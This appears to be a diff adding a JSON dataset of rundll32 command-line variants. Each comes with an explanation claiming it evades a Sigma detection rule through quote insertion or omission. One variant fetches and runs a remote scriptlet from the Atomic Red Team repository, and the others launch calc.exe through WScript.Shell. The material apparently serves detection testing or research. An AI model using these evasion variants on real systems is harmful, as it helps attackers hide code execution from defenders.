@@ -1,0 +1,14 @@
+[
+  {
+    "output": "rundll32.exe vbscript:\"\\..\\mshtml,#135\" +String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)",
+    "explanation": "This command uses insertion of quotes and escape characters to bypass the Sigma rule while maintaining the same functionality. The structure remains valid and is parsed correctly by the system."
+  },
+  {
+    "output": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();",
+    "explanation": "This command applies insertion of quotes and maintains the same logic as the original. It uses equivalent syntax and is still parsed correctly by the system."
+  },
+  {
+    "output": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication\" +String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)",
+    "explanation": "This command uses insertion and omission techniques to reformat the command line. It removes unnecessary elements while preserving the original behavior."
+  }
+]
